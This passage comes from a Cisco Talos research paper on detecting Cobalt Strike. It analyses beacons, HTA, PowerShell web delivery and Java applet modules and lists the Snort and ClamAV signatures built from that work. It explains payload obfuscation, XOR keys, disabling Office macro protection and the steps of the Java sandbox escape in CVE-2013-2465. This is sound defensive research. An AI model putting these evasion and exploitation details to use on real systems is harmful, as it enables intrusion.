is this undesirable for performance reasons, it heightens 
the potential for false positives. We need to be a little more 
cautious when releasing a catch-all rule such as this.

The following <SOFTWARE>Snort</SOFTWARE> rule also helped in detecting reverse 
shell sessions from <TOOL>Metasploit</TOOL>

• [1:30480:3]  INDICATOR-SHELLCODE <TOOL>Metasploit</TOOL> pay-
load windows_x64_meterpreter_reverse_https

After analyzing the preexisting <SOFTWARE>Snort</SOFTWARE> rules, the only thing 
left to cover is the outbound HTTP request and the binary 
blob <MALWARE>Cobalt Strike</MALWARE> retrieves from the C2 server. Typically, 
covering the initial outbound HTTP GET would be ideal 
since we want to identify potential C2 traffic as fast as 
possible and flag the host as compromised in <ORG>Cisco</ORG> 
Firepower NGFW. However, the URI code we used in our 
research could be anything and was always random in 
samples. The HTTP Header fields were also unhelpful, since 
there wasn’t anything unique enough to distinguish the 
request apart from benign traffic. This leaves us with only 

the HTTP response containing the binary blob.

The shellcode started similarly to the raw payload with a 
`cld` instruction followed by a short function designed to 
decrypt the rest of the payload with an operator configured 
XOR key.

Since we don’t want to target encrypted data with our 
detection, we used the start of the shellcode as the 
detection target. This resulted in two new rules, both 
looking for the same thing across different listeners.

• [1:53757:1]  MALWARE-OTHER <MALWARE>CobaltStrike</MALWARE> <IOC>beacon.dll</IOC>
download attempt

• [1:53758:1]  MALWARE-OTHER <MALWARE>CobaltStrike</MALWARE> <IOC>beacon.dll</IOC> 
download attempt

TARGET MODULE: STAGED/STAGELESS EXECUTABLE 
GENERATOR

This module will encompass both staged and stageless 
<MALWARE>Cobalt Strike</MALWARE> <MALWARE>beacons</MALWARE>. This is the core component 
delivered to a victim host and establishes persistence, C2 
communication, and any further execution on the host. 
<MALWARE>Beacons</MALWARE> are extremely versatile and expose a huge number 
of features for operators.

Staged vs. Stageless

Stageless payloads are delivered to the victim all at once. 
Typically, a stageless payload already contains a large 
variety of malicious functionality and will not require 
additional resources to infect the victim.

Staged payloads are usually small, malicious payloads 
that are used to load a larger, more robust payload. This 
allows an attacker to transfer a small binary to a targeted 
host and retrieve the desired payload afterward. Stagers 
are designed to be as small as possible so that they can 
be delivered using different techniques and leave less of a 
footprint.

Having a smaller initial payload with less functionality 
is more likely to evade AV detection by appearing to be 
benign. A stager can then grab the larger payload for more 
functionality and load it directly into memory.

Stagers allow adversaries to embed your payloads in 
different methods. An adversary could take staged code and 
send it in an exploit with resource limitations on the target.



page 9 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

<MALWARE>Beacon</MALWARE> options

Generating a <MALWARE>beacon</MALWARE> payload can 
result in a few different types of 
executable files — each of them 
embedded with a Listener and 
architecture of your choice. This will 
generate an `<IOC>artifact.exe</IOC>` file to save 
on disk. How it’s used from there is 
up to the operator.

• Raw (Stageless only)

• Windows EXE

• Windows Service EXE

• Windows DLL (32 bit)

• Windows DLL (64 bit)

Staged

After startup, <MALWARE>Cobalt Strike</MALWARE> spawns a 
new thread designed to construct a 
named pipe for further execution. For 
the purposes of research, we opted 
to utilize a 32 bit executable with a 
reverse HTTP listener.

Figure 12 shows a format string that 
calls to `sprintf()` with the default 
structure of the named pipe. The 
four-digit number is a randomly 
generated number but we can see 
that in a default configuration, the 
name has a static structure like  
“<IOC>\\\\.\\pipe\\MSSE-6722-server.</IOC>”

Following thread creation, the 
named pipe is created and a 
connection is initiated. The goal of 
this is to process additional shellcode 
embedded within the binary by 
writing it to the named pipe thread.

This pipe is decrypted using a rolling 
XOR against the data. The default 
XOR key for this particular payload 
is 0xE3F4C314. After decryption is 
complete, another thread is created 
that immediately jumps to and 
executes the shellcode (Figure 13).

Figure 12

Figure 13



page 10 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

Stageless

Stageless operates in the same way a staged payload 
does — it still spawns a named pipe and data needs to 
be decrypted just like a staged payload. This payload in 
particular is larger than 200KB.

However, once the final payload is decoded, it needs to be 
loaded into memory. This is performed using a technique 
called <MITRE_ATTACK>Reflective DLL loading</MITRE_ATTACK> — the process of loading a 
library from memory into a host process.

An executable needs to access various resources to 
function correctly. It needs to know its base address in 
memory and have valid headers and a fully built import 
address table. This is how an executable knows where to 
call functions such as LoadLibrary or GetProcAddress.

Once the reflective loader has rebuilt the necessary sections 
and relocated the image, we’ll see the actual path of execution.

Once we unpack <IOC>beacon.dll</IOC>, we can dump it to disk and see 
the final artifact.

<MALWARE>Beacon</MALWARE> configuration

<MALWARE>Cobalt Strike</MALWARE> configuration is marked in the executable by 
patterns that allow us to parse it directly out of an unpacked 
<MALWARE>beacon</MALWARE> DLL. The configuration is XOR encrypted, but by 
default, use a static XOR key for each respective <MALWARE>beacon</MALWARE> 
version (3 or 4).

Figure 14 shows a decrypted <MALWARE>Cobalt Strike</MALWARE> configuration 
from the unpacked <MALWARE>Cobalt Beacon</MALWARE>.

C2 COMMUNICATION

Heartbeat

An infected host will reach out to the <MALWARE>Cobalt Strike</MALWARE> C2 
server periodically with a heartbeat, sending basic 
metadata back home and gathering any commands issued 
by an operator. When a command is requested to be 
executed on the host, it’s queued up and waits for that host 
to reach out.

Figure 14

https://www.exploit-db.com/docs/english/13007-reflective-dll-injection.pdf
https://www.exploit-db.com/docs/english/13007-reflective-dll-injection.pdf


page 11 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

Figure 15 shows the heartbeat.

It looks pretty benign, but all the metadata is stored in the 
HTTP cookie. We can’t simply gain access to that data by 
base64-decoding the cookie, since <MALWARE>Cobalt Strike</MALWARE> heartbeat 
data is encrypted. <MALWARE>Cobalt Strike</MALWARE> uses RSA with PKCS1 
padding to encrypt the data prior to sending it back home.

Talos researchers extracted the private/public key 
directly from the teamserver running on a virtual machine, 
something that wouldn’t be possible outside of an isolated 
research environment.

Tasks

Now that we understand the heartbeats, let’s look at 
the exchange for tasking a <MALWARE><MALWARE>beacon</MALWARE></MALWARE>. When a task is not 
available, the server will respond with another encrypted 

payload in the HTTP 200 OK (Figure 16).

When configured, the response payload is an encrypted 
task. <MALWARE>Cobalt Strike</MALWARE> uses AES-256 in CBC mode with HMAC-
SHA-256 to encrypt task commands. The AES key can 
be found in the <MALWARE>beacon</MALWARE> metadata we decrypted earlier. 
It is calculated using the first 16 bytes of the decrypted 
metadata.

Callbacks

After execution, the host calls back to the C2 server. 
This time, the default configuration was an HTTP POST 
containing another encrypted payload (Figure 17).

The first four bytes are the size of the encrypted payload so 
we skip those when decrypting.

Figure 15

Figure 16

Figure 17



page 12 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

The structure of the data observed is:

• 4 bytes - Counter

• 4 bytes - Data Size

• 4 bytes - Type of callback

• Variable - Data

Figure 18 is a decrypted Process List callback.

Detection

Based on these actions, we wanted to write detection 
that would catch a <MALWARE>Cobalt Strike</MALWARE> stager being downloaded 
before it can target anything else. Catching the stager is 
pivotal, as it is most likely to prevent infection. Once the 
stager traverses into memory, it reflectively loads the final 
<MALWARE>beacon</MALWARE> payload and becomes harder to deal with.

Researchers first generated every variant possible and 
created PCAPs of the stager traversing over typical ports 
seen in file-data traversal.

Once again, we triggered the <TOOL>Metasploit</TOOL> shellcode rules for 
every payload when we checked prior coverage:

• 1:30229 INDICATOR-SHELLCODE <TOOL>Metasploit</TOOL> windows/
shell stage transfer attempt

• 1:30471 INDICATOR-SHELLCODE <TOOL>Metasploit</TOOL> payload 
windows_adduser

• 1:30480 INDICATOR-SHELLCODE INDICATOR-SHELL-
CODE <TOOL>Metasploit</TOOL> payload windows_x64_meterpret-
er_reverse_https

Since we confirmed these rules provide coverage, we can 
move onto the core stageless <MALWARE>beacon</MALWARE>.

The approach here was to once again find a unique set 
of instructions that can be associated with <MALWARE>Cobalt Strike</MALWARE> 
<MALWARE>beacons</MALWARE> while avoiding false positives. It was pretty difficult 
to find a good match in the stageless <MALWARE>beacons</MALWARE>, but the 
function in Figure 19 sparked our interest.

This function is pretty simple — its purpose is to parse the 
DOS header and check for the correct file magic signature. 

Figure 18

Figure 19: A function 
inside a stageless <MALWARE>Cobalt Strike</MALWARE> <MALWARE>beacon</MALWARE>.



page 13 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

If it exists, it jumps to the IMAGE_NT_OPTIONAL header 
and checks the magic there.

After comparison, the AL byte is set to reflect the correct 
architecture. This is used for further processing of the 
file header. A quick run in <SOFTWARE>Snort</SOFTWARE> showed that this alerted 
on every single <MALWARE>beacon</MALWARE> we generated. This doesn’t look 
malicious on the surface, so researchers ran this function 
with multiple preceding NOPs through false-positive 
testing. Expectations were not high, but we couldn’t find a 
single false positive. This wasn’t the case prior to adding in 
the extra alignment bytes. Either NOP was less commonly 
used for alignment in modern compilers, or we were 
extremely lucky. Regardless, we had performed enough 
due diligence in testing to give the rule a shot.

The result was four rules that are still going strong to this day.

• 1:53656 MALWARE-OTHER <MALWARE>Cobalt Strike</MALWARE> x86 execut-
able download attempt

• 1:53657 MALWARE-OTHER <MALWARE>Cobalt Strike</MALWARE> x86 execut-
able download attempt

• 1:53658 MALWARE-OTHER <MALWARE>Cobalt Strike</MALWARE> x64 execut-
able download attempt

• 1:53659 MALWARE-OTHER <MALWARE>Cobalt Strike</MALWARE> x64 execut-
able download attempt

TARGET MODULE: HTML APPLICATION ATTACK 
GENERATOR

The focus of this attack generator is to generate an HTML 
Application (HTA), a file extension for the HTML executable 
file format and typically consists of HTML/Dynamic HTML 
and a scripting language of choice. HTA files behave like 
executables. They are popular among attackers because 
they run as a fully trusted application in certain cases.

When using the HTML Application Attack generator the user 
can select a <MALWARE>Cobalt Strike</MALWARE> listener as usual and the method, 
including executable, <SOFTWARE>PowerShell</SOFTWARE> and <SOFTWARE>VBA</SOFTWARE>.

These methods do not determine the scripting language 
used in the HTA files. In all methods, VBScript is used to 
deliver the desired payload in the HTA file. The method, 
however, changes the payload type and how it is executed 
on the host. Let’s take a look at each of them.

Executable

The executable method (Figure 20) is a straightforward 

attack, as it is simply designed to load a large ASCII hex 
string and execute it on the host.

The shellcode is loaded by creating a `Scripting.
FileSystemOjbect` and using that to create a temporary 
file on the host. After initializing the temporary file, the 
shellcode stream is converted from hex string to bytes and 
written to the file (Figure 18).

Finally, the file is executed using a WScript.Shell object and 
the temporary file and folder are deleted to cover its tracks 
(Figure 21).

<SOFTWARE>PowerShell</SOFTWARE>

The <SOFTWARE>PowerShell</SOFTWARE> method is relatively naive at first glance, 
as it once again uses the WScript.Shell object to invoke 
<SOFTWARE>PowerShell</SOFTWARE>. This time, rather than creating a temporary 
executable file, it simply runs <SOFTWARE>powershell</SOFTWARE> with a large 
base64-encoded command (Figure 22).

We base64 decode the command, which results in a 
unicode string containing additional <SOFTWARE>PowerShell</SOFTWARE> and another 
base64 blob. Here, we can start to see the desired path to 

Figure 22

Figure 20

Figure 21



page 14 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <SOFTWARE><MALWARE>Cobalt Strike</MALWARE></SOFTWARE>

infection, as it takes the second base64 blob and is creating 
an `IO.MemoryStream` object out of it. A quick look at the 
resulting code shows that we, once again, jumped the gun 
in analysis and it’s gzip compressed.

We can quickly decompress the extracted data on the CLI 
(Figure 23).

The newly decoded payload declares some new functions.

• `func_get_proc_address()`

• `func_get_delegate_type()`

This is a fairly old technique (around 2012) that allows 
the user to invoke calls via .NET native method wrappers 
in <SOFTWARE>PowerShell</SOFTWARE>. This allows the user to call the <SOFTWARE>Windows API</SOFTWARE> using and execute code in a fileless manner via the 
`System.Reflection` namespace.

We can then use`GetMethod()` to acquire a handle to the 
desired functionality and bypass any restrictions. The goal 
in this payload is to expose the `GetProcAddress` library 
function so that we can load the desired <SOFTWARE>Windows API</SOFTWARE> code 
and interact with it.

System.Reflection exposes another function called 
`GetDeletegateForFunctionPointer`. Using this, <MALWARE>Cobalt Strike</MALWARE> grabs a function pointer to any API function it needs 
for execution.

Once an executable section of memory is allocated and 

populated.. <MALWARE>Cobalt Strike</MALWARE> can then execute the payload 
in memory through another delegate defined for the 
memory region.

So what is the base64 string this time? It’s shell code, but 
actually XOR encrypted (Figure 24).

This is pretty easy to decrypt. We know that it’s XOR’d using 
the key 0x23 (35) so we can decode this using our method of 
choice. In this case, we used `xortool-xor̀  (Figure 25)

Eventually, we determined that this is the same code as 
seen in the raw payload section in different packaging. 
Once <MALWARE>Cobalt Strike</MALWARE> gets it right, it reuses that work across 
other attack options. This makes it more convenient for 
defenders to write detection.

Figure 23

Figure 24

Figure 25

https://docs.microsoft.com/en-us/dotnet/api/system.reflection


page 15 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

 <SOFTWARE>VBA</SOFTWARE>

The <SOFTWARE>VBA</SOFTWARE> Method gives a little bit of a different approach 
(Figure 26).

So far, we’ve seen basic methods of loading binary code 
and executing it. In this method, we can see that it uses an 
Excel Workbook to execute additional code. The first thing 
that happens is <MALWARE>Cobalt Strike</MALWARE> loads up an `Excel.Application` 
and then queries a registry key:

`HKEY_CURRENT_USER\Software\Microsoft\
Office\<Excel Version>\Excel\Security\AccessVBOM\̀

This key is a security setting for restricting default 
programmatic access to the Office VB project. If it’s 
enabled, Office will trust all macros and run any code 
without a security warning or additional permissions from 
the user. <MALWARE>Cobalt Strike</MALWARE> attempts to flip that switch and 

disable this protection in the registry.

After that, <MALWARE>Cobalt Strike</MALWARE> once again calls the <SOFTWARE>Windows API</SOFTWARE> 
to execute binary code. Then, it allocates an executable 
section of memory within the process and runs it by calling 
`kernel32.dll!CreateRemoteThread`.

Detection

This type of multilayer obfuscation is easy to extract when 
in hand but can be extremely effective against security 
products that don’t know it’s coming. But it’s possible to 
work around this.

For the executable method, the shellcode was actually the 
same assembly code as what we discussed earlier in the 
Staged/Stageless Executables. The NOP-based function is 
interpreted as a hex string, so we can clone those rules to 

Figure 26



page 16 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

match a hex string, rather than actual bytes.

• 1:54110 MALWARE-OTHER <MALWARE>Html.Trojan.CobaltStrike</MALWARE> 
HTML <MALWARE>beacon</MALWARE> download attempt

• 1:54111 MALWARE-OTHER <MALWARE>Html.Trojan.CobaltStrike</MALWARE> 
HTML <MALWARE>beacon</MALWARE> download attempt

• 1:54112 MALWARE-OTHER <MALWARE>Html.Trojan.CobaltStrike</MALWARE> 
HTML <MALWARE>beacon</MALWARE> download attempt

• 1:54113 MALWARE-OTHER <MALWARE>Html.Trojan.CobaltStrike</MALWARE> 
HTML <MALWARE>beacon</MALWARE> download attempt

For the <SOFTWARE>PowerShell</SOFTWARE> method, we have again a ton of 
obfuscated code underneath it, so the coverage should 
target generic function calls. For this, we went with the 
<SOFTWARE>PowerShell</SOFTWARE> command arguments, and supplemented that 
with matching on a Wscript.Shell object being created.

• 1:54114 MALWARE-OTHER <MALWARE>Html.Trojan.CobaltStrike</MALWARE>
<SOFTWARE>powershell</SOFTWARE> payload download attempt

• 1:54115 MALWARE-OTHER <MALWARE>Html.Trojan.CobaltStrike</MALWARE>
<SOFTWARE>powershell</SOFTWARE> payload download attempt

Lastly, we have the <SOFTWARE>VBA</SOFTWARE> Method. Our researchers found 
this easy to cover because HTA files don’t often interface 
with Excel workbooks, let alone one that tinkers with the 
“AccessVBOM” registry key.

• 1:54116 MALWARE-OTHER <MALWARE>Html.Trojan.CobaltStrike</MALWARE> 
<SOFTWARE>VBA</SOFTWARE> payload download attempt

• 1:54117 MALWARE-OTHER <MALWARE>Html.Trojan.CobaltStrike</MALWARE> 
<SOFTWARE>VBA</SOFTWARE> payload download attempt

From there, we cloned all that to <SOFTWARE>ClamAV</SOFTWARE> coverage to get 
the following signatures:

• <MALWARE>Html.Trojan.CobaltStrike</MALWARE>-7932561-0

• <MALWARE>Html.Trojan.CobaltStrike</MALWARE>-7932562-0

• <MALWARE>Html.Trojan.CobaltStrike</MALWARE>-7932563-0

• <MALWARE>Html.Trojan.CobaltStrike</MALWARE>-7932564-0

TARGET MODULE: SCRIPTED WEB DELIVERY

In <MALWARE>Cobalt Strike</MALWARE>, there’s a feature called “scripted web 
delivery.” Executing a scripted web delivery attack simply 
means that you pick one of the <MALWARE>Cobalt Strike</MALWARE> payloads/
listeners and <MALWARE>Cobalt Strike</MALWARE> will then host that payload at 
a user-configured URI. These can be generated in three 
different languages: <SOFTWARE>Bitsadmin</SOFTWARE>, <SOFTWARE>PowerShell</SOFTWARE> and <SOFTWARE>Python</SOFTWARE>.

After hosting the payload, <MALWARE>Cobalt Strike</MALWARE> provides a 

command that can be executed, in the language of choice, 
that reaches out and grabs the malicious payload from an 
attacker-controlled web server and executes it.

We are only going to concentrate on the <SOFTWARE>PowerShell</SOFTWARE> 
implementation, as it is the most commonly used module. 
The initial execution is using a web client to download an 
additional <SOFTWARE>PowerShell</SOFTWARE> payload from the attacker controlled 
web server and then continue to execute that code.

Payload

After reaching out to grab the real payload, we get a huge 
obfuscated <SOFTWARE>PowerShell</SOFTWARE> script from the web server, almost 
200KB in size.

This script contained code reuse from the HTA module, 
but we still needed to go one layer deeper and verify the 
shellcode was unique in this module. We base64-decode 
the data and decrypt it using the same `0x23` default 
XOR key — and it’s already much larger than the previous 
payload.

It’s not raw shellcode like we saw in the HTA payloads, 
you can immediately see that the “MZ” header is present. 
This seems to be a stageless <MALWARE>beacon</MALWARE> included in the 
<SOFTWARE>PowerShell</SOFTWARE> script. You might wonder why it wasn’t 
included in the HTA attack. The reason is the HTA module 
is executing a <SOFTWARE>PowerShell</SOFTWARE> one-liner and Windows has 
a character limit on command line strings, 32767. That 
number is even lower when executing a command from 
`cmd.exe`, 8191. The character limit varies across a variety 
of execution methods and these numbers are not always 
going to be correct.

Since this payload is downloaded using a small one-liner to 
execute a string retrieved from the <MALWARE>Cobalt Strike</MALWARE> controlled 
server, that limit is bypassed and a more reliable payload 
can be provided.

Detection

To detect something, we first have to narrow down what 
we can actually see in <SOFTWARE>Snort</SOFTWARE> or <SOFTWARE>ClamAV</SOFTWARE>. We are not able 
to deobfuscate a <SOFTWARE>PowerShell</SOFTWARE> script coming across the 
network prior to detection — it’s simply not feasible without 
introducing latency for the client in most cases.

So, for detection, we are left with the initial obfuscated 
payload downloaded. That’s not so bad because <MALWARE>Cobalt Strike</MALWARE>, in its current configuration, once again has a 



page 17 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

static format when generating the <SOFTWARE>PowerShell</SOFTWARE> script. 
We know that in this instance, the code `New-Object 
IO.MemoryStream(,[Convert]:: FromBase64String(` following 
will always be present in a position relatively close to the 
start of the file.

This gives us simple, but efficient, coverage using

• 1:53973 MALWARE-OTHER <MALWARE>CobaltStrike</MALWARE> <SOFTWARE>PowerShell</SOFTWARE> 
web delivery attempt

• 1:53974 MALWARE-OTHER <MALWARE>CobaltStrike</MALWARE> <SOFTWARE>PowerShell</SOFTWARE> 
web delivery attempt

TARGET MODULE: SIGNED <TECHNIQUE>JAVA APPLET ATTACK</TECHNIQUE>

The applets in this attack are self-signed, giving users 
limited options: a listener (per usual), port, local host and 
the URI it’s hosted on. This will spawn a hosted <SOFTWARE>Java</SOFTWARE> Applet 
on a malicious <MALWARE>Cobalt Strike</MALWARE> web server to infect users. If a 
user gives an applet permission to run, infection will occur.

Landing Page

Upon visiting the page, the user sees a generic landing 
page that loads a malicious JAR file, “<IOC>cross_platformi9.jar</IOC>” 
and applet class loaded is defined by the “code” parameter, 
“Java.class” (Figure 27).

The first thing that catches the eye is that two parameters 
are passed — “id,” which contains a large base64 blob, and 
“type” which is set to “theme.” We can confirm this right off 
the bat by comparing the length of the raw HTTP <MALWARE>beacon</MALWARE> 
payload against the length of the decoded binary blob, both 
a total of 799 bytes.

A second HTTP GET request is made for the JAR file during 
the process of loading this applet. So that’s the next step.

Java archive (JAR)

First, we’ll look at the JAR file (Figure 28).

We have a few classes, and two DLLs named “main.dll” 
and “main64.dll”. You can also see the default signature file 

Figure 27

Figure 28



page 18 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

(MYKEY.SF) and RSA certificate (MYKEY.RSA) used to sign 
the binary. Figure 29 shows us jusing jadx to decompile the 
source code.

The base code called “Java.class” isn’t complicated — it’s 
an extension of “Applet” designed to spawn a thread. And 
the Base64.dll class isn’t malicious, it handles base64 as 
expected.

“Main.class” is fairly basic but shows us that a temporary 
file is created, named “main.dll” and writes data to that 
file from either the main64.dll or main.dll file contained in 
the JAR file based on the system architecture. The system 
property “sun.arch.data.model” is a simple method to return 
the system’s word size, easily determining the architecture. 
Following this, the new DLL file path is fed to `System.
load()`.

<MALWARE>Cobalt Strike</MALWARE> uses the <SOFTWARE>Java Native Interface</SOFTWARE> (<SOFTWARE>JNI</SOFTWARE>) to perform 
injection. This is essentially the same as creating bindings 
to another program. It allows users to load a library into the 
<SOFTWARE>Java Virtual Machine</SOFTWARE> (<SOFTWARE>JVM</SOFTWARE>) and interact with it.

Main.dll

Since inject() is called from the <SOFTWARE>JNI</SOFTWARE> with the shellcode blob, 
we can load this into IDA and see an exposed function — 
J̀ava_Main_inject()`.

The handoff to J̀ava_Main_inject` isn’t as straightforward as 
it would be passing a byte/character array in <SOFTWARE>C/C++</SOFTWARE>. In this 
case the exported function looks a little like Figure 30:

The data is extracted from the <SOFTWARE>JNI</SOFTWARE> objects and then passed 
to the real `inject()` function that spawns a new thread and 
resumes execution in the shellcode passed in from the “id” 
parameter.

Detection

We need to isolate the things we want to cover and 
separate them from each other when evaluating multiple 

levels of execution. Here, we can identify a few things.

1. The landing page that spawns the malicious applet

2. The JAR file

3. main.dll/main64.dll

The landing page was fairly simple, as we already identified 
that the parameter is simply the raw payload from earlier. 
The JAR files contain the same DLL 32/64 bit and code 
every time but have a different name. This simplifies things 
as we target what we know is malicious in there.

The last thing was the extracted DLL, and our prior work 
paid off. We had prior coverage available from various x32/
x64 download rules we created researching the staged/
stageless beacons.

TARGET MODULE: SMART JAVA APPLET ATTACK

The Smart Java Applet Attack is very similar to Signed Applets 
in execution. Instead of just running raw shell code, though, it 
attempts to gain execution through various Java exploits. It is 
deemed “Smart” as it determines what exploit to use based 
on the version of Java the victim host is running.

Landing Page

The landing page is for the most part the same as Signed 
Applet Attacks. It spawns a malicious page on the default 
URI, “/SiteLoader.”

Once again, there’s a base64 blob containing the “id” 

Figure 29

Figure 30



page 19 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

parameter and a “type” parameter 
with the value “os.” The payload is 
slightly different, however, since it 
uses the same shellcode stub. We 
already know what this does for 
the most part, so we’ll skip further 
analysis.

Java Archive

Per the <MALWARE>Cobalt Strike</MALWARE> official 
documentation, we can get a brief 
understanding of this module’s goal.

• The smart applet analyzes its 
environment and decides which 
Java exploit to use. If the Java 
version is vulnerable, the applet 
will disable the security sandbox, 
and spawn a session using <MALWARE>Cobalt Strike</MALWARE>’s Java injector.

• These exploits in this attack work 
against Java 1.7u21 and older. 
Java 1.6u45 and older is also 
vulnerable to this attack.

The exploits used are not specified 
however, we know it affects the Java 
versions shown in Figure 31. Since 
we don’t know what exploits it’s 
using already, we must look closer.

There are a lot more classes shown 
in Figure 32, but we can see that 
main.dll/main64.dll are still included. 
A quick `sha256sum` reveals that 
these are the same DLLs included 
in the Signed Applet Attack module. 
We once again can decompile the jar 
using `jadx` as we did in the Signed 
Applet Attack. The decompilation 
was not clean as we receive one 
error for an unknown instruction, 
“invoke-polymorphic”. This 
instruction is not currently supported 
in jadx, so we will just ignore it for 
now and start looking at J̀avaApplet.
class` in Figure 31.

This class directs execution based on 

Figure 31

Figure 32

the version of Java installed, here we can identify how it targets each version. The 
code polls “java.version” via a call to System.getProperty to get the JRE version 
installed, if any. Following that it is matched against the PCRE `1.(\d+).0_(\d+)`. The 
important thing with this PCRE is that it has two capture groups that retrieve major 
and minor Java versions for further processing. It’s important to understand the 
structure of Java version strings. [See https://www.oracle.com/java/technologies/
javase/versioning-naming.html].  
 
""1.<Major Version>.0_<Update Release>""

When the version string for the product is reported as “java version 1.8.0_5”, the 
product will be called <SOFTWARE>JDK 8u5</SOFTWARE>, <SOFTWARE>JDK 8</SOFTWARE> update 5 or, when the update version is not 

https://www.oracle.com/java/technologies/javase/versioning-naming.html
https://www.oracle.com/java/technologies/javase/versioning-naming.html


page 20 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

important, <SOFTWARE>JDK 8</SOFTWARE>.

We discovered this module exploits multiple vulnerabilities. 
The <SOFTWARE>Java</SOFTWARE> execution flow is as follows:

• <= Java 6u27 -> `Rhino()`

• <= Java 6u45 -> `AppIcon()`

• == Java 7u0 -> `Rhino()`

• <= Java 7u6 -> `Exec()`

• <= Java 7u21 -> `Bean()`

If the regex fails and the version string is equal to “1.7.0” 
also direct execution to `Rhino()`

Main.java

Main.java contains the same code as we saw in the Signed 
Applet attack. Its sole purpose is to run main.dll, or main64.
dll, with the shellcode provided in the “id” parameter by 
interfacing with the <SOFTWARE>JNI</SOFTWARE>. We will touch on how this works a 

bit in the next section.

<CVE>CVE-2011-3544</CVE> - <SOFTWARE>Oracle</SOFTWARE> <SOFTWARE>Java</SOFTWARE> applet rhino script engine 
remote code execution

<SOFTWARE>Java</SOFTWARE> Version <= 1.6.0_27 or <SOFTWARE>Java</SOFTWARE> Version == 7.0

This class is associated with the <SOFTWARE>Rhino</SOFTWARE> Script Engine which 
is used to run arbitrary code outside of the <SOFTWARE>Java</SOFTWARE> sandbox.

This was dangerous at one point in time because these 
<SOFTWARE>JavaScript</SOFTWARE> objects were not controlled by the <SOFTWARE>Java</SOFTWARE> 
SecurityManager. Protections were put in place to limit 
attempts to execution however it was determined that you 
bypass the sandbox limitations by storing <SOFTWARE>Java</SOFTWARE> code in a 
string and then executing it. When executing the `toString()` 
method, it returns a <SOFTWARE>Java</SOFTWARE> function in the context of the caller 
(Figure 33).

So if we are restricted by the permissions of the caller, 
we are still limited in execution privileges. Instead, we 

Figure 33



page 21 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

need to generate an error object containing the code as 
its message. This module extends the Main class. When 
spawning a thread of itself, it will look to see if the class 
implemented `Runnable` and the `run()` function, which 
`Main` does. This means that the goal is to spawn main.dll 
with desired shellcode but from outside the sandbox.

<CVE>CVE 2013-2465</CVE> - <SOFTWARE>Oracle</SOFTWARE> <SOFTWARE>Java</SOFTWARE> 2D ImagingLib remote 
code execution

<SOFTWARE>Java</SOFTWARE> Version <= 1.6.0_45

This vulnerability exploits a vulnerability when filtering() 
BufferedImage’s using `AffineTransformOp`.

First, some necessary helper classes are defined 
to assert certain behavior later down the road, 
“ComponentColorModel” and “ICC_ColorSpace” (Figure 34).

Figure 35 shows a defined ColorComponentModel that 

is supplied to the `BufferedImage` constructor to fool a 
specific check within `storeImageArray()`. That check is 
for `(hintP->packing == BYTE_INTERLEAVED)`. When this 
check succeeds, data is written back to the destination. 
The second class defines a ComponentColorModel 
that will always return `True` when calling 
`isCompatibleRaster()`.

Now to prepare an exploit, we move to `loadIcon()`. First, 
we need to prepare the necessary objects for execution. 
The order of the following allocations is extremely 
important as we want them to be aligned in memory 
(Figure 35).

To get a better understanding of Java access control security. 
A `Statement̀  object can represent arbitrary method calls. 
When an instance of `Statement̀  is created, the current 
security context is stored in `Statement.acc .̀ When calling 
`execute()̀  on that statement, <SOFTWARE>Java</SOFTWARE> attempts to verify that the 

Figure 34

Figure 35



page 22 of 29© 2020 <ORG>Cisco</ORG>. All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting <MALWARE>Cobalt Strike</MALWARE>

permissions surrounding that call have 
not been changed by looking at the 
value of `Statement.acc .̀ Therefore 
the goal of this exploit is to gain the 
correct permissions on `System.
setSecurityManager()̀  to disable it by 
overwriting it’s `AccessControlContext̀ . 
To prepare for that, a new 
`Permissions̀  object is created with 
`AllPermission()̀  (Figure 36).

Now, comes <CVE>CVE-2013-2465</CVE>  
(Figure 37).

Two `BufferedImagè  are created. The 
second uses the dataBufferByte[] 
object we declared earlier. A raster 
is created with a `dataBitOffset` 
that points outside of the 
`dataBufferByte[16]` memory structure. 
<MALWARE>CobaltStrike</MALWARE> then sets the first pixel to 
`0xFFFFFFFF .̀ Finally, the vulnerable 
storeImageArray() call through filter() 
is performed and data is written back 
to the object and corrupts the adjacent 
object’s length.

<MALWARE>Cobalt Strike</MALWARE> can now loop 
through `iArr[]` until it finds the 
default `Statement.acc` field and 
overwrite it with the `AllPermission` 
object created earlier. Now, 
`setSecurityManger` can be executed 
with the necessary permissions to 
disable it and run shellcode.

<CVE>CVE-2012-4681</CVE>  - <SOFTWARE>Oracle</SOFTWARE> <SOFTWARE>Java 7</SOFTWARE> 
